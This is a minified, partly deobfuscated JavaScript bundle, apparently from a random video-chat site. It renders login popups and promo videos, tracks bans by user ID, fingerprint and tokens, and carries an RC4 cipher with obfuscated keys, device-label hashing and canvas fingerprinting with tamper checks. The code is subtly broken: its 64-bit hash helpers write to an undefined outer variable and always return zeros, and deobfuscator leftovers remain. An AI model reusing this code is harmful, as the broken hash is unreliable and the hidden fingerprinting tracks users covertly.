      var s = {};
      s.className = "app-button googleplay-btn";
      var l = {};
      l.href = config.android_app_url, l.className = "app-btn googleplay", l.target = "_blank", l.rel = "noopener";
      var d = {};
      d.className = "app-button appstore-btn";
      var D = {};
      return D.href = config.ios_app_url, D.className = "app-btn appstore", D.target = "_blank", D.rel = "noopener nofollow", u.a.createElement("div", r, u.a.createElement("div", o, u.a.createElement("a", c), u.a.createElement("a", t)), u.a.createElement("div", x, u.a.createElement("div", s, u.a.createElement("a", l)), u.a.createElement("div", d, u.a.createElement("a", D))));
    }
  }
  var Mn = Ln, Fn = {};
  Fn.ome = "https://video-delivery.x-point-of-entry.com/Ome%20TV.mp4", Fn.minichat = "https://player.vimeo.com/external/491681708.hd.mp4?s=3b7495310401ba7bb39e084e884fdcc002a6068f&profile_id=175";
  const An = ["DZ", "BH", "EG", "JO", "IQ", "YE", "QA", "KW", "LB", "LY", "MR", "MA", "AE", "OM", "PS", "SA", "SY", "SO", "SD", "TN", "BR", "AR", "PH", "ID", "IN", "CO", "CL", "MY"], kn = Fn;
  class En extends u.a.Component {
    ["render"]() {
      var e = f, n = {};
      n.className = "login-buttons";
      var a = {};
      a.onClick = this.openLoginWindow.bind(this, config.fb_login_url), a.className = "login-button zucker-button";
      var i = {};
      i.className = "svg-fb-button";
      var r = {};
      r.className = "tr", r["data-tr"] = "continue_with", r["data-tr-id"] = "1393";
      var o = {};
      o.onClick = this.openLoginWindow.bind(this, config.vk_login_url), o.className = "login-button vk-button";
      var c = {};
      c.className = "svg-vk-button";
      var t = {};
      return t.className = "tr", t["data-tr"] = "continue_with", t["data-tr-id"] = "1393", u.a.createElement("div", n, u.a.createElement("div", a, u.a.createElement("i", i), u.a.createElement("span", r, "continue_with"), " FB"), u.a.createElement("div", o, u.a.createElement("i", c), u.a.createElement("span", t, "continue_with"), " VK"));
    }
    ["openLoginWindow"](e) {
      var n = f;
      const a = [["toolbar", "no"], ["location", "no"], ["directories", "no"], ["status", "no"], ["menubar", "no"], ["scrollbars", "no"], ["resizable", "no"], ["copyhistory", "no"], ["width", 800], ["height", 600], ["top", screen.height / 2 - 300], ["left", screen.width / 2 - 400]].map(e => e.join("=")).join(", ");
      window.open(e, "", a);
    }
  }
  class jn extends u.a.Component {
    constructor(e) {
      var n, a = f;
      super(e), (n = "opened") in this ? Object.defineProperty(this, n, {value: false, enumerable: true, configurable: true, writable: true}) : this[n] = false, this.state = {visible: false, canPlayVideo: false, showCloseBtn: true, reloadAfterLogin: false, youtube: false}, window.rComponents.loginPopup = this, this.stream = u.a.createRef();
    }
    ["componentDidUpdate"](e, n) {
      var a = f;
      this.props.authorized && !e.authorized && (this.state.reloadAfterLogin ? Helper.reload() : this.hide(false));
    }
    ["render"]() {
      var e = f, n = {};
      n.className = "popup login-popup", n.onClick = this.handlePopupClick;
      var a = {};
      return a.className = "login-popup__content", u.a.createElement("div", n, u.a.createElement("div", a, this.renderLeftBlock(), this.renderRightBlock()));
    }
    ["handlePopupClick"](e) {
      var n = f;
      e.stopPropagation(), e.nativeEvent.stopImmediatePropagation();
    }
    ["renderLeftBlock"]() {
      var e = f;
      const n = "login-popup__item left" + (this.state.canPlayVideo ? " no-bg" : "");
      switch (config.env) {
        case "ome":
        case "minichat":
          var a = {};
          a.className = n;
          var i = {};
          return i.className = "logo", u.a.createElement("div", a, u.a.createElement("div", i), u.a.createElement(de, null), this.renderVideo());
        default:
          var r = {};
          r.className = n;
          var o = {};
          o.className = "welcome";
          var c = {};
          c.className = "tr", c["data-tr"] = "welcome_to", c["data-tr-id"] = "479";
          var t = {};
          return t.className = "logo", u.a.createElement("div", r, u.a.createElement("div", o, u.a.createElement("span", c, "welcome_to")), u.a.createElement("div", t), u.a.createElement(de, null));
      }
      return "";
    }
    ["renderVideo"]() {
      var e = f;
      if (!this.state.visible) return "";
      if (this.state.youtube) {
        const f = document.createElement("script");
        f.src = "https://www.youtube.com/player_api";
        const i = document.getElementsByTagName("script")[0];
        var n = {};
        n.className = "video";
        var a = {};
        return a.id = "ytplayer", a.className = "youtube", i.parentNode.insertBefore(f, i), window.onYouTubePlayerAPIReady = () => {
          var n = e, a = {};
          a.mute = 1, a.controls = 0, a.autoplay = 1, a.loop = 1, a.hl = "ar", a.playlist = "kNCxJrxM6Ms", a.suggestedQuality = "highres";
          var f = {};
          f.onReady = this.onCanPlayVideo.bind(this);
          var i = {};
          i.height = "480", i.width = "576", i.videoId = "kNCxJrxM6Ms", i.playerVars = a, i.events = f, new YT.Player("ytplayer", i);
        }, u.a.createElement("div", n, u.a.createElement("div", a), u.a.createElement("div", null));
      }
      const i = kn[config.env];
      var r = {};
      r.className = "video";
      var o = {};
      o.autoPlay = true, o.controls = false, o.muted = true, o.loop = true, o.playsInline = true, o.onCanPlay = this.onCanPlayVideo.bind(this);
      var c = {};
      return c.src = i, c.type = "video/mp4", u.a.createElement("div", r, u.a.createElement("video", o, u.a.createElement("source", c)));
    }
    ["renderRightBlock"]() {
      var e = f;
      switch (config.env) {
        case "ome":
          var n = {};
          n.className = "login-popup__item right";
          var a = {};
          a.className = "close-popup", a.onClick = this.hide.bind(this);
          var i = {};
          i.className = "h1";
          var r = {};
          r.className = "tr", r["data-tr"] = "become_a_member", r["data-tr-id"] = "1421";
          var o = {};
          o.className = "h2";
          var c = {};
          c.className = "tr", c["data-tr"] = "this_is_the_best_place", c["data-tr-id"] = "1422";
          var t = {};
          t.className = "logo";
          var x = {};
          x.className = "disclaimer";
          var s = {};
          return s.className = "tr", s["data-tr"] = "sign_in_to", s["data-tr-id"] = "1420", u.a.createElement("div", n, this.state.showCloseBtn ? u.a.createElement("div", a) : "", u.a.createElement("div", i, u.a.createElement("span", r, "become_a_member")), u.a.createElement("div", o, u.a.createElement("span", c, "this_is_the_best_place")), u.a.createElement("div", t), u.a.createElement("div", x, u.a.createElement("span", s, "sign_in_to")), u.a.createElement(En, null));
        default:
          var l = {};
          l.className = "login-popup__item right";
          var d = {};
          d.className = "close-popup popup-close", d.onClick = this.hide.bind(this);
          var D = {};
          D.className = "h1";
          var b = {};
          b.className = "tr", b["data-tr"] = "sign_in_to", b["data-tr-id"] = "1420";
          var C = {};
          C.className = "disclaimer";
          var m = {};
          return m.className = "tr", m["data-tr"] = "18-yo-confirm", m["data-tr-id"] = "1339", u.a.createElement("div", l, this.state.showCloseBtn ? u.a.createElement("div", d) : "", u.a.createElement("div", D, u.a.createElement("span", b, "sign_in_to")), u.a.createElement(En, null), u.a.createElement("div", C, u.a.createElement("span", m, "18-yo-confirm")));
      }
      return "";
    }
    ["onCanPlayVideo"]() {
      var e = f, n = {};
      n.canPlayVideo = true, this.setState(n);
    }
    ["show"](e = false) {
      var n = f;
      if (this.opened || config.is_vk_app) return;
      const a = e && !Helper.queryParam("no_reload");
      var i = {};
      i.visible = true, i.showCloseBtn = !e, i.reloadAfterLogin = a, this.setState(i), Overlay.show($(".login-popup"), e ? null : this.hide.bind(this)), e && setTimeout(window.destroy.bind(window.destroy), 1e3), this.stream.current && this.stream.current.play(), this.opened = true;
    }
    ["hide"](e = true) {
      var n = f;
      this.stream.current && this.stream.current.pause(), e ? settings.show() : Overlay.hide($(".login-popup")), this.opened = false;
    }
    ["setCountry"](e) {
      var n = f;
      if (this.state.visible) return;
      const a = "ome" === config.env && (!!Helper.queryParam("yt") || An.includes(e));
      var i = {};
      i.youtube = a, this.setState(i);
    }
  }
  var Sn = te(e => ({authorized: e.snAuth.authorized}))(jn);
  class Tn extends u.a.Component {
    ["render"]() {
      var e = f, n = {};
      n.id = "overlay", n.className = "overlay", n.onClick = this.handleClick;
      var a = {};
      a.className = "popup-holder";
      var i = {};
      i.className = "popup-top-box";
      var r = {};
      r.className = "popup-top-box-chock";
      var o = {};
      o.className = "popup-data-box";
      var c = {};
      c.className = "popup-container";
      var t = {};
      t.className = "popup-content";
      var x = {};
      x.id = "disconnection-popup", x.className = "popup popup-gray disconnection-popup";
      var s = {};
      s.className = "popup-header";
      var l = {};
      l.id = "disconnection-popup-message", l.className = "disconnection-popup__message tr", l["data-tr-id"] = "1241", l["data-tr"] = "connection_closed";
      var d = {};
      d.className = "disconnection-popup__button";
      var D = {};
      D.className = "btn-gray btn-reload reload-button";
      var b = {};
      b.className = "tr", b["data-tr-id"] = "1242", b["data-tr"] = "restart";
      var C = {};
      C.className = "popup-footer";
      var m = {};
      m.className = "popup-footer__button";
      var v = {};
      v.className = "btn-main btn-reload reload-button";
      var g = {};
      g.className = "tr", g["data-tr-id"] = "1242", g["data-tr"] = "restart";
      var _ = {};
      _.id = "local-video-warning-popup", _.className = "popup popup-gray video-warning";
      var h = {};
      h.className = "popup-header";
      var w = {};
      w.className = "tr", w["data-tr-id"] = "1327", w["data-tr"] = "you_here";
      var p = {};
      p.className = "video-warning__screens";
      var y = {};
      y.className = "video-warning__image";
      var z = {};
      z.className = "screen local", z.src = "";
      var B = {};
      B.className = "video-warning__ico no";
      var L = {};
      L.className = "video-warning__screens-delim";
      var M = {};
      M.className = "video-warning__image";
      var F = {};
      F.className = "screen example";
      var A = {};
      A.backgroundImage = 'url("/images/roulette/popup_girl.jpg")';
      var k = {};
      k.className = "screen example", k.style = A;
      var E = {};
      E.className = "video-warning__ico yes";
      var j = {};
      j.className = "video-warning__title";
      var S = {};
      S.className = "tr", S["data-tr-id"] = "1327", S["data-tr"] = "you_here";
      var T = {};
      T.className = "video-warning__text";
      var P = {};
      P.className = "tr", P["data-tr-id"] = "1330", P["data-tr"] = "show_face";
      var H = {};
      H.className = "video-warning__btn";
      var N = {};
      N.className = "btn-main ok";
      var q = {};
      q.className = "popup-bottom-box";
      var K = {};
      return K.className = "popup-bottom-box-chock", u.a.createElement("div", n, u.a.createElement("div", a, u.a.createElement("div", i, u.a.createElement("div", r)), u.a.createElement("div", o, u.a.createElement("div", c, u.a.createElement("div", t, u.a.createElement(Bn, null), u.a.createElement("div", x, u.a.createElement("div", s, u.a.createElement("span", null, "Error")), u.a.createElement("div", l, "connection_closed"), u.a.createElement("div", d, u.a.createElement(Te, D, u.a.createElement("span", b, "restart"))), u.a.createElement("div", C, u.a.createElement("div", m, u.a.createElement(Te, v, u.a.createElement("span", g, "restart"))))), u.a.createElement(_n, null), u.a.createElement(Mn, null), u.a.createElement("div", _, u.a.createElement("div", h, u.a.createElement("span", w, "you_here")), u.a.createElement("div", p, u.a.createElement("div", y, u.a.createElement("img", z), u.a.createElement("i", B)), u.a.createElement("div", L), u.a.createElement("div", M, u.a.createElement("div", F), u.a.createElement("div", k), u.a.createElement("i", E))), u.a.createElement("div", j, u.a.createElement("span", S, "you_here")), u.a.createElement("div", T, u.a.createElement("span", P, "show_face")), u.a.createElement("div", H, u.a.createElement(Te, N, u.a.createElement("span", null, "OK")))), u.a.createElement(yn, null), u.a.createElement(Sn, null)))), u.a.createElement("div", q, u.a.createElement("div", K))));
    }
    ["handleClick"]() {
      var e = f;
      window.onOverlayClick && window.onOverlayClick();
    }
  }
  var Pn = Tn, Hn = {};
  Hn["en-US"] = "English (U-S-) 2.mp4", Hn.fr = "French 2.mp4", Hn.fi = "Finnish 2.mp4", Hn["fr-CA"] = "French (Canada) 2.mp4", Hn.de = "German 2.mp4", Hn.zh = "Chinese (Simplified) 2.mp4", Hn.da = "Danish 2.mp4", Hn.nl = "Dutch 2.mp4", Hn.ko = "Korean 2.mp4", Hn.el = "Greek 2.mp4", Hn.id = "Indonesian 2.mp4", Hn.it = "Italian 2.mp4", Hn.ja = "Japanese 2.mp4", Hn.ms = "Malay 2.mp4", Hn.no = "Norwegian 2.mp4", Hn["pt-BR"] = "Portuguese (Brazil) 2.mp4", Hn.pt = "Portuguese (Portugal) 2.mp4", Hn.ru = "Russian 2.mp4", Hn["es-MX"] = "Spanish (Mexico) 2.mp4", Hn.es = "Spanish (Spain) 2.mp4", Hn.sv = "Swedish 2.mp4", Hn.th = "Thai 2.mp4", Hn.tr = "Turkish 2.mp4", Hn.vi = "Vietnamese 2.mp4", Hn["en-GB"] = "English (U-K-) 2.mp4", Hn["en-CA"] = "English (Canada) 2.mp4", Hn["en-AU"] = "English (Australia) 2.mp4", Hn["zh-Hant"] = "Chinese (Traditional) 2.mp4", Hn.cs = "Czech 2.mp4", Hn.hu = "Hungarian 2.mp4", Hn.ro = "Romanian 2.mp4", Hn.sk = "Slovak 2.mp4", Hn.ca = "Catalan 2.mp4", Hn.hi = "Hindi 2.mp4", Hn.hr = "Croatian 2.mp4", Hn.pl = "Polish 2.mp4", Hn.uk = "Ukrainian 2.mp4";
  const Nn = Hn;
  class qn extends u.a.Component {
    ["render"]() {
      var e = f;
      const n = Helper.isIos() ? "ios" : "android", a = Helper.isIos() ? config.ios_app_url : config.android_app_url, i = _.language, r = i.slice(0, 2), o = Nn[i] || Nn[r] || Nn["en-US"], c = config.video_cdn + "/ome.tv/" + o;
      var t = {};
      t.className = "ometv-landing visible " + n;
      var x = {};
      x.className = "ometv-landing__block-1";
      var s = {};
      s.className = "ometv-landing__phone";
      var l = {};
      l.className = n, l.href = a, l.target = "_blank", l.rel = "noopener";
      var d = {};
      d.className = "ometv-landing__video";
      var D = {};
      D.autoPlay = true, D.controls = false, D.muted = true, D.loop = true, D.playsInline = true;
      var b = {};
      b.src = c, b.type = "video/mp4";
      var C = {};
      C.className = "ometv-landing__phone-frame";
      var m = {};
      m.className = "ometv-landing__block-2";
      var v = {};
      v.className = "ometv-landing__logo";
      var g = {};
      g.className = "ometv-landing__text tr", g["data-tr"] = "meet_someone_new", g["data-tr-id"] = "1403";
      var h = {};
      h.className = "ometv-landing__button";
      var w = {};
      w.className = "app-button ios";
      var p = {};
      p.href = config.ios_app_url, p.className = "app-btn appstore", p.target = "_blank", p.rel = "noopener nofollow";
      var y = {};
      y.className = "app-button android";
      var z = {};
      return z.href = config.android_app_url, z.className = "app-btn googleplay", z.target = "_blank", z.rel = "noopener", u.a.createElement("div", t, u.a.createElement("div", x, u.a.createElement("div", s, u.a.createElement("a", l, u.a.createElement("div", d, u.a.createElement("video", D, u.a.createElement("source", b))), u.a.createElement("div", C)))), u.a.createElement("div", m, u.a.createElement("div", v), u.a.createElement("div", g), u.a.createElement("div", h, u.a.createElement("div", w, u.a.createElement("a", p)), u.a.createElement("div", y, u.a.createElement("a", z)))));
    }
  }
  var Kn = qn, Un = class {
    constructor() {
      var e = f;
      this.cachedData = null, this.get = this.get.bind(this), this.set = this.set.bind(this);
    }
    ["get"]() {
      return new Promise((e, n) => {
        var a = _0x28ad;
        let f;
        try {
          f = localStorage.getItem("ld");
        } catch (e) {}
        f ? e(this.cachedData = JSON.parse(f)) : n();
      });
    }
    ["set"](e) {
      var n = f;
      this.cachedData = e;
      try {
        localStorage.setItem("ld", JSON.stringify(e));
      } catch (e) {}
      return e;
    }
  };
  const Zn = ["UserId", "Fingerprint", "Fingerprint2", "Token", "FbToken", "VkToken"];
  var Gn = class {
    constructor(e) {
      var n = f;
      window.destroy.online = e.Online, this.data = e, this.country = e.Country, this.banNum = Math.max.apply(null, this.getNums(e, "BanNum")), this.unbanNum = Math.max.apply(null, this.getNums(e, "UnbanNum")), this.isPayer = this.unbanNum > 0, this.attachedData = new class {
        constructor(e) {
          var n = f;
          const a = "string" == typeof e ? JSON.parse(e) : e || {};
          this.isSilenced = !!a.Silenced, this.isFemale = !!a.MarkedAsFemale, this.isSuspected = !!a.MarkedAsSuspected;
        }
      }(e.AttachedData), this.isCoolUser = !!(this.attachedData.isFemale || this.isPayer || window.blogger.validBlogger), this.silencedByIpOrFp = Math.max(~~e.IpMarkState, ~~e.FpMarkState) > 1;
    }
    ["getNums"](e, n) {
      return Zn.map(a => ~~e["" + a + n]);
    }
  }, Yn = class {
    constructor(e) {
      var n = f;
      this.i = 0, this.j = 0;
      let a = this.s = new Uint8Array(256);
      for (let e = 0; e < 256; e++) a[e] = e;
      let i = e.length, u = 0;
      for (let n = 0; n < 256; n++) {
        u = u + a[n] + e[n % i] & 255;
        let f = a[n];
        a[n] = a[u], a[u] = f;
      }
      this.drop(128);
    }
    ["process"](e) {
      var n = f;
      let a = this.i, i = this.j, u = this.s, r = e.length;
      for (let n = 0; n < r; n++) {
        a = a + 1 & 255;
        let f = u[a];
        i = i + f & 255;
        let r = u[i];
        u[a] = r, u[i] = f, e[n] ^= u[f + r & 255];
      }
      this.i = a, this.j = i;
    }
    ["drop"](e) {
      this.process(new Uint8Array(e));
    }
  };
  function Vn(e, n, a) {
    var i = f, u = {};
    return u.value = a, u.enumerable = true, u.configurable = true, u.writable = true, n in e ? Object.defineProperty(e, n, u) : e[n] = a, e;
  }
  Blob.prototype.arrayBuffer = Blob.prototype.arrayBuffer || function () {
    return new Promise(e => {
      var n = _0x28ad;
      let a = new FileReader;
      a.onload = () => {
        e(a.result);
      }, a.readAsArrayBuffer(this);
    });
  };
  class In {
    static async ["build"](e, n, a, i, u, r) {
      var o = f;
      const c = (t = a, x = i, e.slice(t, x).map(e => String.fromCharCode(e - 1e3)).join(""));
      var t, x, s = {};
      s.type = "text/plain";
      const l = n.slice(u, r), d = new Blob([c, l], s), D = await d.arrayBuffer(), b = new Uint8Array(D);
      return new In(b);
    }
    constructor(e) {
      var n = f;
      Vn(this, "encode", e => {
        var a = n;
        let f = (new TextEncoder).encode(e);
        return this.rc4.process(f), f;
      }), Vn(this, "decode", async e => {
        var a = n;
        const f = await e.arrayBuffer();
        let i = new Uint8Array(f);
        return this.rc4.process(i), new TextDecoder("utf-8").decode(i);
      }), this.rc4 = new Yn(e);
    }
  }
  var Wn = In;
  function Jn(e, n, a) {
    var i = f, u = {};
    return u.value = a, u.enumerable = true, u.configurable = true, u.writable = true, n in e ? Object.defineProperty(e, n, u) : e[n] = a, e;
  }
  let Rn, On;
  const Xn = [1079, 1086, 1099, 1105, 1103, 1110, 1114, 1076, 1066, 1055, 1077, 1107, 1078, 1100, 1052, 1090, 1053, 1077, 1121, 1119, 1118, 1101, 1057, 1098, 1111, 1089, 1052, 1078, 1083, 1083, 1069, 1051, 1103, 1090, 1100, 1051, 1077, 1056, 1076, 1116, 1089, 1103, 1116, 1112, 1075];
  async function $n(e) {
    var n = f;
    Rn = await Wn.build(Xn, e, 6, 20, 0, 16), On = await Wn.build(Xn, e, 28, 42, 16, 32);
  }
  var Qn = a(6);
  function ea(e, n, a) {
    var i = f, u = {};
    return u.value = a, u.enumerable = true, u.configurable = true, u.writable = true, n in e ? Object.defineProperty(e, n, u) : e[n] = a, e;
  }
  function na(e, n, a) {
    return function (e, n, a) {
      var f = _0x28ad;
      if (n.set) n.set.call(e, a); else {
        if (!n.writable) throw new TypeError("attempted to set read only private field");
        n.value = a;
      }
    }(e, aa(e, n, "set"), a), a;
  }
  function aa(e, n, a) {
    var i = f;
    if (!n.has(e)) throw new TypeError("attempted to " + a + " private field on non-instance");
    return n.get(e);
  }
  let fa, ia, ua;
  const ra = [1083, 1083, 1069, 1051, 1072, 1053, 1090, 1104, 1079, 1086, 1099, 1105, 1103, 1110, 1100, 1109, 1072, 1118, 1052, 1090, 1053, 1077, 1121, 1119, 1116, 1112, 1075, 1097, 1081, 1115, 1118, 1101, 1057, 1098, 1111, 1089, 1052, 1078, 1090, 1100, 1051, 1077, 1056, 1076, 1116, 1089, 1103];
  var oa = new WeakMap;
  let ca = function (e, n) {
    e = [e[0] >>> 16, 65535 & e[0], e[1] >>> 16, 65535 & e[1]], n = [n[0] >>> 16, 65535 & n[0], n[1] >>> 16, 65535 & n[1]];
    return a[3] += e[3] + n[3], a[2] += 0, a[3] &= 65535, a[2] += e[2] + n[2], a[1] += 0, a[2] &= 65535, a[1] += e[1] + n[1], a[0] += 0, a[1] &= 65535, a[0] += e[0] + n[0], a[0] &= 65535, [0, 0];
  }, ta = function (e, n) {
    e = [e[0] >>> 16, 65535 & e[0], e[1] >>> 16, 65535 & e[1]], n = [n[0] >>> 16, 65535 & n[0], n[1] >>> 16, 65535 & n[1]];
    return a[3] += e[3] * n[3], a[2] += 0, a[3] &= 65535, a[2] += e[2] * n[3], a[1] += 0, a[2] &= 65535, a[2] += e[3] * n[2], a[1] += 0, a[2] &= 65535, a[1] += e[1] * n[3], a[0] += 0, a[1] &= 65535, a[1] += e[2] * n[2], a[0] += 0, a[1] &= 65535, a[1] += e[3] * n[1], a[0] += 0, a[1] &= 65535, a[0] += e[0] * n[3] + e[1] * n[2] + e[2] * n[1] + e[3] * n[0], a[0] &= 65535, [0, 0];
  }, xa = function (e, n) {
    return 32 == (n %= 64) ? [e[1], e[0]] : n < 32 ? [e[0] << n | e[1] >>> 32 - n, e[1] << n | e[0] >>> 32 - n] : (n -= 32, [e[1] << n | e[0] >>> 32 - n, e[0] << n | e[1] >>> 32 - n]);
  }, sa = function (e, n) {
    return 0 == (n %= 64) ? e : n < 32 ? [e[0] << n | e[1] >>> 32 - n, e[1] << n] : [e[1] << n - 32, 0];
  }, la = function (e, n) {
    return [e[0] ^ n[0], e[1] ^ n[1]];
  }, da = function (e) {
    return e = la(e, [0, e[0] >>> 1]), e = ta(e, [4283543511, 3981806797]), e = la(e, [0, e[0] >>> 1]), e = ta(e, [3301882366, 444984403]), la(e, [0, e[0] >>> 1]);
  };
  var Da = function (e, n = 3735928559) {
    var a = f;
    n = n || 0;
    for (var i = (e = e || "").length % 16, u = e.length - i, r = [0, n], o = [0, n], c = [0, 0], t = [0, 0], x = [2277735313, 289559509], s = [1291169091, 658871167], l = 0; l < u; l += 16) c = [255 & e.charCodeAt(l + 4) | (255 & e.charCodeAt(l + 5)) << 8 | (255 & e.charCodeAt(l + 6)) << 16 | (255 & e.charCodeAt(l + 7)) << 24, 255 & e.charCodeAt(l) | (255 & e.charCodeAt(l + 1)) << 8 | (255 & e.charCodeAt(l + 2)) << 16 | (255 & e.charCodeAt(l + 3)) << 24], t = [255 & e.charCodeAt(l + 12) | (255 & e.charCodeAt(l + 13)) << 8 | (255 & e.charCodeAt(l + 14)) << 16 | (255 & e.charCodeAt(l + 15)) << 24, 255 & e.charCodeAt(l + 8) | (255 & e.charCodeAt(l + 9)) << 8 | (255 & e.charCodeAt(l + 10)) << 16 | (255 & e.charCodeAt(l + 11)) << 24], c = ta(c, x), c = xa(c, 31), c = ta(c, s), r = la(r, c), r = xa(r, 27), r = ca(r, o), r = ca(ta(r, [0, 5]), [0, 1390208809]), t = ta(t, s), t = xa(t, 33), t = ta(t, x), o = la(o, t), o = xa(o, 31), o = ca(o, r), o = ca(ta(o, [0, 5]), [0, 944331445]);
    switch (c = [0, 0], t = [0, 0], i) {
      case 15:
        t = la(t, sa([0, e.charCodeAt(l + 14)], 48));
      case 14:
        t = la(t, sa([0, e.charCodeAt(l + 13)], 40));
      case 13:
        t = la(t, sa([0, e.charCodeAt(l + 12)], 32));
      case 12:
        t = la(t, sa([0, e.charCodeAt(l + 11)], 24));
      case 11:
        t = la(t, sa([0, e.charCodeAt(l + 10)], 16));
      case 10:
        t = la(t, sa([0, e.charCodeAt(l + 9)], 8));
      case 9:
        t = la(t, [0, e.charCodeAt(l + 8)]), t = ta(t, s), t = xa(t, 33), t = ta(t, x), o = la(o, t);
      case 8:
        c = la(c, sa([0, e.charCodeAt(l + 7)], 56));
      case 7:
        c = la(c, sa([0, e.charCodeAt(l + 6)], 48));
      case 6:
        c = la(c, sa([0, e.charCodeAt(l + 5)], 40));
      case 5:
        c = la(c, sa([0, e.charCodeAt(l + 4)], 32));
      case 4:
        c = la(c, sa([0, e.charCodeAt(l + 3)], 24));
      case 3:
        c = la(c, sa([0, e.charCodeAt(l + 2)], 16));
      case 2:
        c = la(c, sa([0, e.charCodeAt(l + 1)], 8));
      case 1:
        c = la(c, [0, e.charCodeAt(l)]), c = ta(c, x), c = xa(c, 31), c = ta(c, s), r = la(r, c);
    }
    return r = la(r, [0, e.length]), o = la(o, [0, e.length]), r = ca(r, o), o = ca(o, r), r = da(r), o = da(o), r = ca(r, o), o = ca(o, r), ("00000000" + (r[0] >>> 0).toString(16)).slice(-8) + ("00000000" + (r[1] >>> 0).toString(16)).slice(-8) + ("00000000" + (o[0] >>> 0).toString(16)).slice(-8) + ("00000000" + (o[1] >>> 0).toString(16)).slice(-8);
  };
  function ba(e, n = "") {
    var a = f;
    const i = e.devices();
    if (0 === i.length) return null;
    const u = "" + n + JSON.stringify(i.map(e => e.label));
    return Da(u);
  }
  const Ca = function () {
    var e = f, n = true, a = true, i = 0, u = false, r = false, o = {};
    Array.prototype.indexOf || (Array.prototype.indexOf = function (n, a) {
      var f, i = e;
      if (null == this) throw new TypeError("'this' is null or undefined");
      var u = Object(this), r = u.length >>> 0;
      if (0 === r) return -1;
      var o = +a || 0;
      if (Math.abs(o) === Infinity && (o = 0), o >= r) return -1;
      for (f = Math.max(o >= 0 ? o : r - Math.abs(o), 0); f < r;) {
        if (f in u && u[f] === n) return f;
        f++;
      }
      return -1;
    });
    var c = Array.prototype.forEach, t = Array.prototype.map, x = function () {
      var n = e, a = {}, f = "window.addEventListener(<~!@#$%^&*-+,.>) 😃", i = document.createElement("canvas");
      i.width = 320, i.height = 200, i.style.display = "inline";
      var u = i.getContext("2d");
      u.rect(0, 0, 10, 10), u.rect(2, 2, 6, 6), a.wnd = false === u.isPointInPath(5, 5, "evenodd"), u.textBaseline = "alphabetic", u.fillStyle = "#f60", u.fillRect(125, 1, 62, 20), u.fillStyle = "#069", u.font = "11pt Arial", u.fillText(f, 2, 15), u.fillStyle = "rgba(102, 204, 0, 0.2)", u.font = "18pt Arial", u.fillText(f, 4, 45), u.globalCompositeOperation = "multiply", u.fillStyle = "rgb(255,0,255)", u.beginPath(), u.arc(50, 50, 50, 0, 2 * Math.PI, true), u.closePath(), u.fill(), u.fillStyle = "rgb(0,255,255)", u.beginPath(), u.arc(100, 50, 50, 0, 2 * Math.PI, true), u.closePath(), u.fill(), u.fillStyle = "rgb(255,255,0)", u.beginPath(), u.arc(75, 100, 50, 0, 2 * Math.PI, true), u.closePath(), u.fill(), u.fillStyle = "rgb(255,0,255)", u.arc(75, 75, 75, 0, 2 * Math.PI, true), u.arc(75, 75, 25, 0, 2 * Math.PI, true), u.fill("evenodd");
      var r = CanvasRenderingContext2D.prototype.putImageData, o = {};
      o.value = function () {};
      var c = {};
      return c.value = r, Object.defineProperty(CanvasRenderingContext2D.prototype, "putImageData", o), a.url = i.toDataURL(), Object.defineProperty(CanvasRenderingContext2D.prototype, "putImageData", c), a;
    }, s = function () {
      var n = e, a = {};
      a.type = 0, a.tduOvr = false, a.r = 0, a.g = 0, a.b = 0, a.a = 0;
      var f = a, i = function (e, a) {
        var f = n;
        return Math.abs(e) > Math.abs(a) ? e : a;
      }, u = document.createElement("canvas");
      u.width = u.height = 10, u.style.display = "inline";
      var r = u.getContext("2d");
      r.fillStyle = "rgba(0, 0, 0, 0.0)", r.fillRect(0, 0, 10, 10);
      var o = r.getImageData(0, 0, 10, 10), c = document.createElement("canvas");
      c.width = c.height = 10, c.style.display = "inline";
      var t = c.getContext("2d");
      t.fillStyle = "rgba(255, 255, 255, 1.0)", t.fillRect(0, 0, 10, 10);
      var x = t.getImageData(0, 0, 10, 10), s = l(o, 0, 0, 0, 0), d = l(x, 255, 255, 255, 255);
      if (s.type != d.type ? f.type = 3 : (f.type = s.type, f.r = i(s.r, d.r), f.g = i(s.g, d.g), f.b = i(s.b, d.b), f.a = i(s.a, d.a)), 0 != f.type && 3 != f.type) {
        (D = document.createElement("canvas")).width = D.height = 10, D.style.display = "inline", (b = D.getContext("2d")).fillStyle = "rgb(127, 127, 127)", b.fillRect(0, 0, 10, 10);
        var D, b, C = D.toDataURL();
        (D = document.createElement("canvas")).width = D.height = 10, D.style.display = "inline", (b = D.getContext("2d")).fillStyle = "rgb(127, 127, 127)", b.fillRect(0, 0, 10, 10);
        var m = CanvasRenderingContext2D.prototype.putImageData, v = {};
        v.value = function () {}, Object.defineProperty(CanvasRenderingContext2D.prototype, "putImageData", v);
        var g = D.toDataURL(), _ = {};
        _.value = m, Object.defineProperty(CanvasRenderingContext2D.prototype, "putImageData", _), g != C && (f.tduOvr = true);
      }
      return f;
    }, l = function (n, a, f, i, u) {
      var r = e, o = {};
      o.type = 0, o.r = 0, o.g = 0, o.b = 0, o.a = 0;
      for (var c = {r: null, g: null, b: null, a: null}, t = o, x = true, s = c, l = 0; l < n.height; l++) {
        for (var d = 0; d < n.width; d++) {
          var D = n.data[4 * (n.width * l + d)], b = n.data[4 * (n.width * l + d) + 1], C = n.data[4 * (n.width * l + d) + 2], m = n.data[4 * (n.width * l + d) + 3], v = {};
          if (v.r = D, v.g = b, v.b = C, v.a = m, null == s.r) s = v; else if (s.r != D || s.g != b || s.b != C || s.a != m) {
            x = false;
            break;
          }
        }
        if (x) break;
      }
      var g = {};
      return g.type = 2, g.r = null, g.g = null, g.b = null, g.a = null, x ? s.r == a && s.g == f && s.b == i && s.a == u || (t = {type: 1, r: s.r - a, g: s.g - f, b: s.b - i, a: s.a - u}) : t = g, t;
    }, d = function (n, a) {
      var f = e, i = n.createBuffer();
      return n.bindBuffer(n.ARRAY_BUFFER, i), n.bufferData(n.ARRAY_BUFFER, new Float32Array(a), n.STATIC_DRAW), i;
    }, D = function (n, a, f, i, u) {
      for (var r = e, o = [], c = 0; c < a; c++) {
        var t = .172555 * Math.PI + 2 * Math.PI * c / a, x = Math.cos(t), s = Math.sin(t), l = x * f, D = s * f, b = i - f;
        o.push(l - u * s), o.push(D + u * x), o.push(l + b * x), o.push(D + b * s), o.push(l + u * s), o.push(D - u * x);
      }
      return d(n, o);
    }, b = function (n, a, f) {
      var i = e, u = n.createShader(f ? n.FRAGMENT_SHADER : n.VERTEX_SHADER);
      return n.shaderSource(u, a), n.compileShader(u), n.getShaderParameter(u, n.COMPILE_STATUS) ? u : null;
